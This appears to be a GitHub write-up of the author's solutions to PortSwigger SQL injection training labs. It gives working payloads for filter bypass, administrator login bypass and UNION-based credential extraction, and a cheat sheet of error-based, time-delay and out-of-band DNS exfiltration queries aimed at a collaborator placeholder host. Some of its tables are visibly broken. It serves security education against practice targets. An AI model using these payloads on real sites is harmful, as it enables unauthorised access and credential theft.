
<h1 align="center">🧠 PortSwigger SQL Injection Labs</h1>

<p align="center">
  <b>🔍 Portswigger SQLi Labs</b><br>
  <i>Status :🧾 Ongoing,</i>
  <i>Lab: SQL Injection vulnerability</i>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/focus-SQL%20Injection-darkred?style=flat-square">
  <img src="https://img.shields.io/badge/goal-Complete%20All%20Portswigger%20Labs-darkblue?style=flat-square">
</p>

---

<h2 align="center">🤫 Lab 1 - Retrieving Hidden Data via SQL Injection</h2>

<p align="center">
  <b>Lab: SQL Injection Vulnerability allows retriving hidden data</b><br>
  <i>Status : ✅ Solved,</i>
  <i>Target: display unreleased products via SQL Injection.</i>
</p>

### 🧠 Lab Context

> This lab contains a SQL injection vulnerability in the product category filter. The application constructs a SQL query like:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Your goal is to perform a SQLi attack and **display unreleased products**.

---

## 🎯 Goal

✅ **Exploit SQL Injection to bypass filter and display unreleased products.**

---

## 🛠️ Basic Injection Strategy

When selecting a category, the app builds the query dynamically without sanitization:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

You can inject a comment to nullify the second condition:

```
https://insecure-website.com/products?category=Gifts'--
```

🔎 This results in:

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

- `--` comments out the rest of the query.
- Now, **all products in 'Gifts'**, released or not, are shown.

---

## 🧪 Test: All Categories (OR Based)

Injecting logic always true to access everything:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Resulting SQL:

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

- `1=1` is always true → All products from all categories shown.
---

## 🧩 Injection Cheat Sheet

| Injection Type | Payload | Effect |
|----------------|---------|--------|
| Comment | `'--` | Comments out the rest |
| Boolean OR | `' OR 1=1--` | Always true condition |
| Error-Based | `' AND 1=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))::text||CHR(113)||CHR(122)||CHR(120)||CHR(113)||CHR(113) AS NUMERIC)--` | Can cause errors and leak info |

## ✅ Lab Status
> ✔️ **Completed** - Successfully display unreleased products.

------

<h2 align="center"> 💉Lab 2 - SQL Injection Vulnerability Allowing Login Bypass </h2>

<p align="center">
  <b>Lab: SQL Injection Vulnerability Allowing Login Bypass</b><br>
  <i>Status : ✅ Solved,</i>
  <i>Target: Login as <code>administrator</code> by bypassing authentication via SQL Injection.</i>
</p>

## 🎯 Objective
Perform a SQL injection attack to log in to the application as the `administrator` user.

---

## 🧪 Scenario Description

This lab contains a SQL injection vulnerability in the **login function**.

The application executes a SQL query similar to:

```
SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
```

Since the application doesn’t implement proper sanitization, you can exploit this to bypass authentication.

---

## 🧠 Understanding the Attack
Injecting the following payload into the `username` field:
```
administrator'--
```

## Why it works?
This transforms the backend query to:

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Here:
- `--` comments out the rest of the query (including password check)
- Only the username is validated, and since it's correct, login is bypassed

---

## 🧰 Tools Used
- 🔍 **Burp Suite**: Used to intercept and modify HTTP request
- 🔑 **Browser**: To view result post-exploit

---

## 🚦 Steps to Solve
<details>
<summary>📋 <strong>Step-by-step Instructions</strong></summary>

1. Open the target application in your browser.
2. Intercept the login request using **Burp Suite**.
3. Modify the `username` field as follows:

   ```administrator'-- ```
   or 
   username=administrator & inject the payload into the password field = ``` ' OR 1=1 --' ```

4. Leave the password blank or anything.
5. Forward the request.
6. You should now be logged in as the administrator.
</details>

---

## ✅ Lab Status
> ✔️ **Completed** - Successfully bypassed authentication and logged in as administrator.
---


<h2 align="center">🔍 Lab 3 - Determining Number of Columns via UNION SQL Injection</h2>

<p align="center">
  <b>Lab: SQL injection UNION attack, determining the number of columns returned by the query</b><br>
  <i>Status : ✅ Solved,</i>
  <i>Target: determine number of columns via SQLi + UNION attack.</i>
</p>

## 🧠 Lab Context

> This lab contains a SQL injection vulnerability in the product category filter. 
> The results from the query are returned in the application's response.

```
SELECT * FROM products WHERE category = 'Gifts'
```

Your goal is to inject a UNION-based payload that matches the column count of the original query.

---

## 🎯 Goal

✅ **Exploit UNION-based SQLi to determine the number of columns in the original query.**

---

## 🛠️ UNION Injection Strategy

The application returns SQL results directly in the HTTP response, allowing you to probe using:

```http
category='+UNION+SELECT+NULL--
```

If the number of `NULL` values doesn't match the original columns, it throws an error. You iterate:

```http
category='+UNION+SELECT+NULL,NULL--
category='+UNION+SELECT+NULL,NULL,NULL--
...
```

Until it works.

This lets you determine how many columns the original query returns.

---

## 🔢 Alternative Strategy: ORDER BY

You can also infer column count using `ORDER BY`:

```http
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

When the ORDER BY number exceeds the actual column count, an error will be shown.

---

## 🧪 Payload Testing Table

| Technique        | Payload                            | Description                                      |
|------------------|------------------------------------|--------------------------------------------------|
| UNION Null Test  | `'+UNION+SELECT+NULL--` | Initial test for 1 column                        |
| UNION Null Test  | `'+UNION+SELECT+NULL,NULL--` | Test for 2 columns                               |
| UNION Null Test  | `'+UNION+SELECT+NULL,NULL,NULL--` | Test for 3 columns (likely success here)         |
| ORDER BY         | `' ORDER BY 1--` | Orders by column 1                               |
| ORDER BY         | `' ORDER BY 3--` | If this breaks → original has less than 3 cols   |

## ✅ Lab Status

> ✔️ Completed - Null-based UNION injection to identify correct column count.

---

<h2 align="center">🔍 Lab 4 - Finding a Column Containing Text Using SQL Injection</h2>

<p align="center">
  <b>Lab: SQL injection UNION attack to find a column that supports text</b><br>
  <i>Status : ✅ Solved,</i>
  <i>Target: Identify a column that supports string data to leak usernames and passwords.</i>
</p>

## 🧠 Lab Context

> This lab has a SQL injection vulnerability in the product category filter.
> 
> Your mission is to:
> 1. Find how many columns are returned by the query.
> 2. Determine which column can handle string/text data types.
> 3. Use UNION SELECT to inject and retrieve the admin username and password.

---

## 🎯 Goal

✅ **Exploit SQLi using UNION SELECT to find a text-compatible column and retrieve string values.**

---
## 🛠️ Steps to Attack

### 1. 🔢 Determine Number of Columns

You already learned this in the previous lab. For example, if the below payload gives no error:

```http
'+UNION+SELECT+NULL,NULL-- 
```
✅ Then the app has 2 columns in the query.

### 2. 🧪 Test Columns for String Compatibility
Now test which column can accept string data. Example payloads:
```
'+UNION+SELECT+'abc',NULL-- 
'+UNION+SELECT+NULL,'abc'-- 
```
👉 When one of these payloads shows abc in the response (or no error), that column supports strings.

### 🧩 Final Injection Payload
After finding column count and which one supports strings, inject:
```
'+UNION+SELECT+NULL,username||'*'||password+FROM+users--
```
🟢 Example:
```
https://<LAB-ID>.web-security-academy.net/filter?category=Lifestyle'+UNION+SELECT+NULL,username||'*'||password+FROM+users--
|| is string concatenation (PostgreSQL-style)
```
This returns administrator*<password> if the second column supports text

## 📌 Notes
On MySQL: -- must be followed by a space or use # for comment.
On Oracle: Use FROM DUAL if required.

## ✅ Lab Status
> ✔️ Completed - Successfully retrieved admin credentials by finding string-compatible column.
---


<h2 align="center">🧠 Lab 5 - SQL Injection UNION Attack: Retrieving Data from Other Tables</h2>

<p align="center">
  <b>Lab: SQL injection UNION attack, retrieving data from other tables</b><br>
  <i>Status : ✅ Solved,</i>
  <i>Target: Exfiltrate usernames and passwords from the <code>users</code> table via UNION-based SQL injection.</i>
</p>


## 🧠 Lab Context

> This lab contains a SQL injection vulnerability in the product category filter.  
> The vulnerable query is likely similar to:
```
SELECT name, description FROM products WHERE category = 'Lifestyle'
```
You must inject into the category parameter and use a UNION-based SQL injection to retrieve data from a different table.

## 🎯 Goal
✅ Retrieve all usernames and passwords from the users table and log in as the administrator.

## 🧠 Step-by-Step Strategy
🔹 Step 1: Determine Number of Columns
Use NULL placeholders in the UNION SELECT until it succeeds:

```
' UNION SELECT NULL,NULL-- 
```
✔️ If the server responds without an error and shows an extra row, then there are 2 columns in the original query.

🔹 Step 2: Identify Text-Compatible Columns
Inject known strings to find which columns accept text:

```
' UNION SELECT 'abc','def'-- 
```
✔️ Observe where 'abc' or 'def' appear in the UI — those are the text-compatible columns.

🔹 Step 3: Extract User Data
Now inject the following to exfiltrate data from the users table:

```
' UNION SELECT username, password FROM users-- 
```
✅ This will display usernames and passwords on the application's main page.

💡 Login as Administrator
Use the credentials you retrieved to log in as the administrator through the provided login form.

## 🧩 Injection Cheat Sheet

| Injection Type     | Payload                                              | Description                          |
|--------------------|------------------------------------------------------|--------------------------------------|
| Number of Columns  | `' UNION SELECT NULL,NULL--`                         | Determines correct column count      |
| Find Text Columns  | `' UNION SELECT 'abc','def'--`                       | Identifies text-rendering columns    |
| Extract Data       | `' UNION SELECT username, password FROM users--`     | Retrieves data from users table      |

## ✅ Lab Status
✔️ Completed – Successfully exploited SQLi to extract user data and logged in as the administrator.
---

<h2 align="center">💻 Lab 6 - SQL Injection UNION Attack: Retrieving Multiple Values in a Single Column</h2>

<p align="center">
  <b>Lab: SQL injection UNION attack, retrieving multiple values in a single column</b><br>
  <i>Status : ✅ Solved,</i>
  <i>Target: Extract usernames and passwords from the `users` table using a UNION attack with string concatenation.</i>
</p>

## 🧠 Lab Context
> This lab contains a SQL injection vulnerability in the product category filter. The response from the query is shown in the application, allowing you to perform a UNION-based SQL injection to retrieve data from another table: `users`, which contains the columns `username` and `password`.
---

## 🎯 Goal
> ✅ Retrieve all usernames and passwords and log in as the `administrator` user.
---

## 🧠 Strategy & Execution
### 🔹 Step 1: Intercept & Modify the Request
Use Burp Suite to intercept the request that sets the product category filter.

### 🔹 Step 2: Determine Column Count & Type
Verify the number of columns and which accept text:
```
'+UNION+SELECT+NULL,'abc'--
```
✅ Confirms 2 columns exist and only one accepts text.

### 🔹 Step 3: Retrieve User Data with Concatenation
Use the Oracle string concatenation operator `||` to retrieve both username and password in one text-compatible column:
```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

✅ This displays data like:
```
administrator~s3cure
wiener~peter
carlos~montoya
```

---

## 🧩 Injection Cheat Sheet
### 🔸 String Concatenation

| DBMS           | Syntax                                         |   |         |
| -------------- | ---------------------------------------------- | - | ------- |
| **Oracle**     | \`'foo'                                        |   | 'bar'\` |
| **Microsoft**  | `'foo' + 'bar'`                                |   |         |
| **PostgreSQL** | \`'foo'                                        |   | 'bar'\` |
| **MySQL**      | `'foo' 'bar'` (space) or `CONCAT('foo','bar')` |   |         |

### 🔸 Substring Extraction

| DBMS       | Syntax                      |
| ---------- | --------------------------- |
| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

### 🔸 Comments

| DBMS       | Syntax                                  |
| ---------- | --------------------------------------- |
| Oracle     | `--comment`, `/*comment*/`              |
| Microsoft  | `--comment`, `/*comment*/`              |
| PostgreSQL | `--comment`, `/*comment*/`              |
| MySQL      | `#comment`, `-- comment`, `/*comment*/` |

### 🔸 Get DB Version

| DBMS       | Query                          |
| ---------- | ------------------------------ |
| Oracle     | `SELECT banner FROM v$version` |
| Microsoft  | `SELECT @@version`             |
| PostgreSQL | `SELECT version()`             |
| MySQL      | `SELECT @@version`             |

### 🔸 List Tables & Columns

| DBMS       | List Tables                               | List Columns                                                               |
| ---------- | ----------------------------------------- | -------------------------------------------------------------------------- |
| Oracle     | `SELECT * FROM all_tables`                | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME'`            |
| Microsoft  | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |
| PostgreSQL | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |
| MySQL      | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |

### 🔸 Trigger Errors (Boolean Test)

| DBMS       | Query                                                                      |
| ---------- | -------------------------------------------------------------------------- |
| Oracle     | `SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`        |
| Microsoft  | `SELECT CASE WHEN (cond) THEN 1/0 ELSE NULL END`                           |
| PostgreSQL | `1 = (SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE NULL END)`            |
| MySQL      | `SELECT IF(cond, (SELECT table_name FROM information_schema.tables), 'a')` |

### 🔸 Visible Errors (Extract Data)

| DBMS       | Query Example                                                                 | Error Message Example                      |
| ---------- | ----------------------------------------------------------------------------- | ------------------------------------------ |
| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`                                    | Conversion failed for varchar 'secret'     |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`                    | Invalid input syntax for integer: "secret" |
| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` | XPATH syntax error: '\secret'              |

### 🔸 Stacked Queries (Batch Execution)

| DBMS       | Support      | Syntax Example   |
| ---------- | ------------ | ---------------- |
| Oracle     | ❌            | —                |
| Microsoft  | ✅            | `QUERY1; QUERY2` |
| PostgreSQL | ✅            | `QUERY1; QUERY2` |
| MySQL      | ⚠️ Sometimes | `QUERY1; QUERY2` |

### 🔸 Time Delays

| DBMS       | Query                                 |
| ---------- | ------------------------------------- |
| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

### 🔸 Conditional Time Delays

| DBMS       | Query Example                                                    |   |                                                                 |
| ---------- | ---------------------------------------------------------------- | - | --------------------------------------------------------------- |
| Oracle     | \`SELECT CASE WHEN (cond) THEN 'a'                               |   | dbms\_pipe.receive\_message(('a'),10) ELSE NULL END FROM dual\` |
| Microsoft  | `IF (cond) WAITFOR DELAY '0:0:10'`                               |   |                                                                 |
| PostgreSQL | `SELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END` |   |                                                                 |
| MySQL      | `SELECT IF(cond, SLEEP(10), 'a')`                                |   |                                                                 |

### 🔸 DNS Lookup (Out-of-Band)

| DBMS       | Query Example                                                                                                                                          |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/"> %remote;]>'),'/l') FROM dual` |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR/a'`                                                                                                      |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR'`                                                                                             |
| MySQL      | `LOAD_FILE('\\BURP-COLLABORATOR\a')` or `SELECT ... INTO OUTFILE '\\BURP-COLLABORATOR\a'`                                                              |

### 🔸 DNS with Data Exfiltration

| DBMS       | Payload Summary                                           |   |                  |
| ---------- | --------------------------------------------------------- | - | ---------------- |
| Oracle     | Use XML and `EXTRACTVALUE()` with \`                      |   | (SELECT query)\` |
| Microsoft  | Build string with query, then execute `xp_dirtree`        |   |                  |
| PostgreSQL | Create PL/pgSQL function to `nslookup` with injected data |   |                  |
| MySQL      | `SELECT your-query INTO OUTFILE '\\BURP-COLLABORATOR\a'`  |   |                  |

---

## ✅ Lab Status
> **Lab Completed** — Successfully performed SQLi using string concatenation to retrieve usernames and passwords and logged in as administrator.

------
### 📚 Learning Takeaways

- SQL comments can terminate rest of a query.
- Boolean logic can bypass conditions.
- Always validate and sanitize user input.

---

### 🚨 Disclaimer

> ⚠️ For **educational purposes only**. Do **not** perform SQLi on systems you don't own or have explicit permission to test.

---

### 🧑‍💻 Author

Built with ❤️ by [PardhuVarma](https://linkedin.com/in/pardhu-sri-rushi-varma-konduru-696886279)

<p align="center">
  <img src="https://img.shields.io/badge/status-Lab%20in%20Progress-darkgreen?style=for-the-badge">
</p>
